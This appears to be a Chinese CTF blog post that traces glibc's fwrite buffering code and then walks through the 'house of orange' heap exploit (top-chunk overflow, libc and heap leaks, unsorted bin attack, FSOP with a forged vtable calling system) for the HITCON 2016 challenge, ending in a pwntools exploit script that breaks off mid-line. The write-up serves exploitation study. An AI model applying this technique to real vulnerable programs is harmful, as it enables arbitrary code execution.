class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>_IO_new_do_write (_IO_FILE *fp, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *data, _IO_size_t to_do)<br>&#123;<br>  <span class="hljs-keyword">return</span> (to_do == <span class="hljs-number">0</span><br>    || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="hljs-number">0</span> : EOF;<br>&#125;<br>libc_hidden_ver (_IO_new_do_write, _IO_do_write)<br></code></pre></td></tr></table></figure><p>​    该函数调用了new_do_write，跟进去，函数在/libio/fileops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span></span><br><span class="hljs-function">_IO_size_t</span><br><span class="hljs-function"><span class="hljs-title">new_do_write</span> <span class="hljs-params">(_IO_FILE *fp, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *data, _IO_size_t to_do)</span></span><br><span class="hljs-function"></span>&#123;<br>  _IO_size_t count;<br>  ...<br>  # 额外判断<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)<br>    &#123;<br>      _IO_off64_t new_pos<br>  = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD)<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      fp-&gt;_offset = new_pos;<br>    &#125;<br>  # 调用函数输出输出缓冲区<br>  count = _IO_SYSWRITE (fp, data, to_do);<br>  ...<br>  # 刷新设置缓冲区指针<br>  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>           &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>           ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);<br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    这里有一个判断，判断fp-&gt;_IO_read_end是否等于fp-&gt;_IO_write_base，如果不等的话，调用_IO_SYSSEEK去调整文件偏移。</p><p>​    接着就调用_IO_SYSWRITE函数，该函数时vtable中的__write(_IO_new_file_write)函数，也就是最终执行系统调用的地方，跟进去看，文件在/libio/fileops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_ssize_t<br>_IO_new_file_write (_IO_FILE *f, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *data, _IO_ssize_t n)<br>&#123;<br>  _IO_ssize_t to_do = n;<br>  <span class="hljs-keyword">while</span> (to_do &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>    # 系统调用write输出<br>      _IO_ssize_t count = (__builtin_expect (f-&gt;_flags2<br>               &amp; _IO_FLAGS2_NOTCANCEL, <span class="hljs-number">0</span>)<br>         ? write_not_cancel (f-&gt;_fileno, data, to_do)<br>         : write (f-&gt;_fileno, data, to_do));<br>  ...   <br>  <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    执行完_IO_SYSWRITE函数后，回到new_do_write函数，刷新设置缓冲区指针并返回。</p><p>​    经历了缓冲区建立以及刷新缓冲区，程序返回到_IO_new_file_xsputn函数中，进入到以下代码块。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"># 检查输出数据是否是大块<br>    block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;<br>    do_write = to_do - (block_size &gt;= <span class="hljs-number">128</span> ? to_do % block_size : <span class="hljs-number">0</span>);<br><br><br>    <span class="hljs-keyword">if</span> (do_write)<br>&#123;<br>  # 如果是大块的话则不使用输出缓冲区而直接输出。<br>  count = new_do_write (f, s, do_write);<br>  to_do -= count;<br>  <span class="hljs-keyword">if</span> (count &lt; do_write)<br>    <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    运行到此处，此时已经经过了_IO_OVERFLOW函数（对输出缓冲区进行了初始化或刷新），也就是说此时的IO_FILE缓冲区指针的状态是处于刷新的初始化状态，输出缓冲区中也没用数据。</p><p>​    上面这部分代码检查剩余目标输出数据大小，如果超过输出缓冲区f-&gt;_IO_write_end – f-&gt;_IO_write_base的大小，则为了提高效率，不在使用输出缓冲区，而是以块（4kb）为基本单位直接将缓冲区调用new_do_write输出。new_do_write函数在上面已经跟过了，就是输出，并刷新指针设置。</p><p>​    由于示例程序只输出0x20大小的数据，而它的输出缓冲区大小为0x1000，因此不会进入这部分代码。</p><p>​    在以大块为基本单位把数据直接输出后可能还剩余小数据，IO采用的策略是将剩余目标输出数据放入到输出缓冲区里面，相关源码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"># 剩余的数据拷贝至输出缓冲区<br>     <span class="hljs-keyword">if</span> (to_do)<br> to_do -= _IO_default_xsputn (f, s+do_write, to_do);<br></code></pre></td></tr></table></figure><p>​    程序调用_IO_default_xsputn函数对剩下的s + do_write数据进行操作，跟进去该函数，在/libio/genops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_default_xsputn (_IO_FILE *f, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *s = (<span class="hljs-keyword">char</span> *) data;<br>  _IO_size_t more = n;<br>  <span class="hljs-keyword">if</span> (more &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>      <span class="hljs-comment">/* Space available. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)<br>  &#123;<br>    _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;<br>    <span class="hljs-keyword">if</span> (count &gt; more)<br>      count = more;<br>    <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">20</span>)<br>      &#123;<br>        # 输出长度大于<span class="hljs-number">20</span>，则调用<span class="hljs-built_in">memcpy</span>拷贝<br>        <span class="hljs-built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);<br>        f-&gt;_IO_write_ptr += count;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        s += count;<br>      &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (count)<br>      &#123;<br>        # 小于<span class="hljs-number">20</span>则直接赋值<br>        <span class="hljs-keyword">char</span> *p = f-&gt;_IO_write_ptr;<br>        _IO_ssize_t i;<br>        <span class="hljs-keyword">for</span> (i = count; --i &gt;= <span class="hljs-number">0</span>; )<br>    *p++ = *s++;<br>        f-&gt;_IO_write_ptr = p;<br>      &#125;<br>    more -= count;<br>  &#125;<br>  # 如果输出缓冲区为空，则调用_IO_OVERFLOW直接输出。<br>      <span class="hljs-keyword">if</span> (more == <span class="hljs-number">0</span> || _IO_OVERFLOW (f, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>) *s++) == EOF)<br>  <span class="hljs-keyword">break</span>;<br>      more--;<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - more;<br>&#125;<br>libc_hidden_def (_IO_default_xsputn)<br></code></pre></td></tr></table></figure><p>​    可以看到函数最主要的作用就是将剩余的目标输出数据拷贝到输出缓冲区里。为了性能优化，当长度大于20时，使用memcpy拷贝，当长度小于20时，使用for循环赋值拷贝。如果输出缓冲区为空，则调用_IO_OVERFLOW进行输出。</p><p>​    根据源码可知，示例程序最终会进入_IO_default_xsputn中，并且把数据拷贝到输出缓冲区里，执行完成后，看到IO_FILE结构体的数据如下。</p><p> <img src="https://s2.loli.net/2021/12/26/IwEPv1jxcAbmWOh.png"></p><p>​    可以看到此时的_IO_write_base为0x602270，而_IO_write_ptr为0x602290，大小正好是0x20。至此，源码分析结束。</p><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a><a href="https://files.buuoj.cn/files/0bb7a5f7f7e032c913ba3c373e7cf88e/houseoforange_hitcon_2016?token=eyJ1c2VyX2lkIjo4ODY0LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyOTh9.YNHWEQ.yi3I-oRWIrGXpwwQlb5mSz121MM">house of orange</a></h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>​    FSOP: File Stream Oriented Programming</p><p>​    当malloc_printer时有以下调用关系</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_malloc =&gt; malloc_printerr =&gt; __libc_message =&gt; <span class="hljs-built_in">abort</span> =&gt; _IO_flush_all_lockp<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Flush all streams.  We cannot close them now because the user</span><br><span class="hljs-comment">   might have registered a handler for SIGABRT.  */</span><br><span class="hljs-keyword">if</span> (stage == <span class="hljs-number">1</span>)<br>  &#123;<br>    ++stage;<br>    fflush (<span class="hljs-literal">NULL</span>); <span class="hljs-comment">//abort中刷新了stream</span><br>  &#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;libio/libioP.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span><br><br>_IO_flush_all_lockp -&gt; JUMP_FILE(_IO_OVERFLOW)<br></code></pre></td></tr></table></figure><p> House of orange的原理就是调用malloc时，利用unsorted bin中错误的fd/bk指针，触发malloc_printer函数打印错误信息，malloc_printer调用__libc_message，_<em>libc_message调用abort()，abort()调用_IO_flush_all_lockp。</em></p><p>在_IO_flush_all_lockp中，通过对链表结构_IO_list_all中每个节点进行遍历，找到符合条件的节点，执行_IO_OVERWRITE函数，其中特点是_IO_FILE_PLUS类型的结构体，对函数的查找需要通过vtable定位函数表。如果我们可以劫持IO表中的_IO_OVERFLOW就可以getshell。</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>checksec查看程序保护。</p><p> <img src="https://s2.loli.net/2021/12/26/ZvoPAIFxuK5URCM.png"></p><p>​     漏洞点在于一开始申请堆块时候是按照输入的size做malloc，而edit的时候也输入的新的size但没有验证合法性，造成堆溢出。</p><p> <img src="https://s2.loli.net/2021/12/26/OtoQUDPIL86bHly.png"></p><p>​    其他函数都没啥问题，而且打印堆块内容的函数，泄露libc困难。</p><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>​     要完成利用的第一步通常就是泄露libc基址，这里可以通过堆溢出修改top chunk的size，让其进入unsorted bin中，然后切割泄露libc基址。但是需要注意的是：</p><ol><li><p>伪造的size必须要对齐到内存页</p></li><li><p>Size要大于MINSIZE(0x10)</p></li><li><p>Size要小于之后申请的chunk size + MINSIZE(0x10)</p></li><li><p>Size的prev_inuse位必须为1</p></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p32(<span class="hljs-number">0x10</span>)+p32(<span class="hljs-number">0x1f</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0xfa1</span>), <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>) <span class="hljs-comment"># 通过溢出修改top chunk的size为0xfa1</span><br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>) <span class="hljs-comment"># 申请一个大于此时topchunk的size，使top chunk掉入unsortbin</span><br></code></pre></td></tr></table></figure><p>​    执行完add(0x10, ‘verf1sh’, 0x10, 1)，已经有三个堆块了。</p><p> <img src="https://s2.loli.net/2021/12/26/4F5yU6Cnkv7PB9M.png"></p><p>​    这时，通过编辑堆块功能处的堆溢出漏洞将top chunk的size改小。</p><p> <img src="https://s2.loli.net/2021/12/26/5DwdErnpSkQqOGU.png"></p><p> <img src="https://s2.loli.net/2021/12/26/seYSh4pHCFXlgP3.png"></p><p>​    这时候再通过add(0x1000, ‘verf1sh’, 0x10, 1)申请一个大小大于top chunk的堆块，堆管理器就会使用brk拓展堆，并将原来的top chunk释放到unsorted bin中。这样我们就构造处了一个处于unsorted bin的堆块。</p><p> <img src="https://s2.loli.net/2021/12/26/SlKfwvzPYemqup8.png"></p><p>​    再add一次大chunk，就会从unsorted bin里切割，可以show出libc的地址。同时，如果这个chunk是large chunk，在fd_nextsize和bd_nextsize中还会存储堆的地址，由此就可以完成信息泄露。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leak libc_base</span><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">1640</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>_IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-comment"># leak heap_base</span><br>edit(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span><br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br></code></pre></td></tr></table></figure><p>​    执行完add(0x400, ‘a’*8, 0x10, 1)，获取到的chunk如下图所示。</p><p> <img src="https://s2.loli.net/2021/12/26/FCTGrUezVXwHY13.png">接下来就是涉及IO_FILE的利用了，就是前置知识中讲提及的FSOP（File Stream Oriented Programming)。关于IO_FILE的概念在前面讲解fopen、fread和fwrite的时候已经介绍过了，这里再复习一下。</p><p>​    每个FILE结构体都通过一个_IO_FILE_plus结构体定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>​    其中包括一个IO_FILE结构体和一个vtable虚表指针。</p><p>​    根据house of orange的流程，下面就是利用unsorted bin attack来修改_IO_list_all指针的值。unsorted bin attack在上次实验中已经介绍过了，简单来说就是在malloc的过程中，unsorted bin会从链表上卸下来，将其中最后一个chunk取出，并把倒数第二个chunk的fd设置为unsortedbin_chunk(av)的地址其实就是(&amp;main_arena+88)，而此时我们将unsorted bin中的chunk的bk改成_IO_list_all-0x10，这样从unsorted bin中取出它时，就可以成功将_IO_list_all改写为&amp;main_arena+88了。</p><p>​    前面说过在malloc出错时会调用malloc_printer函数来输出错误信息，其最终调用的函数其实就是vtable中的_IO_OVERFLOW函数。所以如果可以控制_IO_list_all 的值，同时伪造一个IO_FILE和vtable并放入FILE链表中，就可以让malloc_printer打印错误信息时进入我们伪造vtable，将_IO_OVERFLOW函数篡改为system，那么就会调用system函数了。</p><p>​    但是想要成功调用_IO_OVERFLOW函数还需要绕过一些阻碍。</p><p> <img src="https://s2.loli.net/2021/12/26/fGOg5vdaNs37PJn.png"></p><p>​    观察代码发现，_IO_OVERFLOW存在于if之中，若要执行到_IO_OVERFLOW，就需要让前面的判断都能满足，即：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_vtable_offset (fp) == <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br></code></pre></td></tr></table></figure><p>​    以上条件至少要满足一个，这里我们选择第一个，只需构造mode、_IO_write_ptr和_IO_write_base。因为这些都是我们可以伪造的_IO_FILE中的数据，所以比较容易实现。</p><p>​    在前面介绍的unsortedbin attack可以将_IO_list_all指针的值修改为&amp;main_arena+88。但这还不够，因为我们很难控制main_arena中的数据，并不能在mode、_IO_write_ptr和_IO_write_base的对应偏移处构造出合适的值。</p><p>   所以我们将目光转向_IO_FILE的链表特性。在前文_IO_flush_all_lockp函数的代码最后，可以发现程序通过fp = fp-&gt;_chain不断的寻找下一个_IO_FILE。</p><p> <img src="https://s2.loli.net/2021/12/26/RkZyE6TxgvA4FJ8.png"></p><p>​    所以如果可以修改fp-&gt;_chain到一个我们伪造好的_IO_FILE的地址，那么就可以成功实现利用了。</p><p>​    巧妙的是，_IO_FILE结构中的chain字段对应偏移是0x68，而在&amp;main_arena+88对应偏移为0x68的地址正好是大小为0x60的small bin的bk，而这个地址的刚好是我们可以控制的。</p><p>​    如果通过溢出，将位于unsorted bin中的chunk的size修改为0x61。那么在下一次malloc的时候，因为在其他bin中都没有合适的chunk，malloc将会进入大循环，把unsorted bin中的chunk放回到对应的small bin或large bin中。</p><p>​    因此，我们将位于unsorted bin中的chunk的size修改为0x61，因此该chunk就会被放入大小为0x60的small bin中，同时，该small bin的fd和bk都会变为此chunk的地址。</p><p>​    这样，当_IO_flush_all_lockp函数通过fp-&gt;_chain寻找下一个_IO_FILE时，就会寻找到smallbin 0x60中的chunk。只要在这个chunk中伪造好_IO_FILE结构体以及vtable，把_IO_OVERFLOW设置为system，然后就可以成功getshell了。</p><p>   这样，当_IO_flush_all_lockp函数通过fp-&gt;_chain寻找下一个_IO_FILE时，就会寻找到smallbin 0x60中的chunk。</p><p> <img src="https://s2.loli.net/2021/12/26/TRrc8X6MfNJWkud.png"></p><p>​    而这时就到了我们伪造的_IO_FILE处，我们已经把伪造的IO_FILE结构体的vtable表中偏移为3出的__overflow函数已经被篡改为system了。</p><p> <img src="https://s2.loli.net/2021/12/26/C4RJhDNMT7AU2r5.png"></p><p>​    这些unsorted bin attack和FSOP的操作都是在最后执行malloc(0x10)的时候完成的。</p><p>​    至此整个调试过程分析完毕。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./houseoforange_hitcon_2016&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br> p = process(binary)<br><span class="hljs-keyword">else</span>:<br> p = remote(<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">length, name, price, color</span>):</span><br> p.sendlineafter(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br> p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(length))<br> p.sendafter(<span class="hljs-string">&#x27;:&#x27;</span>, name)<br> p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(price))<br> p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(color))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br> p.sendlineafter(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">length, name, price, color</span>):</span><br> p.sendlineafter(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br> p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(length))<br> p.sendafter(<span class="hljs-string">&#x27;:&#x27;</span>, name)<br> p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(price))<br> p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(color))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><br>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>)<br><br>edit(<span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p32(<span class="hljs-number">0x10</span>)+p32(<span class="hljs-number">0x1f</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0xfa1</span>), <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># leak libc_base</span><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">1640</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>_IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-comment"># leak heap_base</span><br>edit(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span><br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span 